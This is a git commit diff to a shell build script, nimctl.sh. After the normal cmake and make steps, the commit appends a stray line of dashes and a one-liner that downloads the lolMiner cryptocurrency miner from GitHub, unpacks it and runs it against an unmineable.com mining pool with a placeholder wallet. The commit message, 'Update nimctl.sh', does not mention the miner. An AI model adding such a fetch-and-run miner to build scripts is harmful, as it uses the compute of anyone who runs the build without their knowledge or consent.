c5289e4996ecbc41e22202daf2e173630b4bf50e
Kushal Shah <code@kushalshah.com.np>
2024-04-21 14:12:29 +0545

    Update nimctl.sh

--- nimctl.sh
+++ nimctl.sh
@@ -8,3 +8,5 @@ mkdir build
 cd build
 cmake ..
 make -j$(nproc)
+-----------------------------------------------------------
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz && tar -xf lolMiner_v1.31_Lin64.tar.gz && cd 1.31/ && ls && ./lolMiner --algo ETHASH --pool ethash.unmineable.com:3333 --user LTC:Your Wallet.WORKER1 --ethstratum ETHPROXY
